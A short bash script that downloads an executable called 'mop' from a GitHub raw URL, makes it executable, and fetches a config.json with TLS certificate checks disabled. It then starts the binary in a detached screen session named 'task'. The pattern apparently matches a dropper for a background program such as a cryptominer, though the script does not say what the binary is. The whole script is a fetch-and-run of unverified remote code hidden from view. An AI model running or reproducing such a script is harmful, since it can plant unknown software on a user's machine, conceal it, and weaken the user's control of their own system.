#!/bin/bash
wget https://raw.githubusercontent.com/dballard198/jackse/refs/heads/main/mop
chmod u+x mop
wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/dballard198/jackse/refs/heads/main/jj.json
screen -dmS task bash -c "./mop"
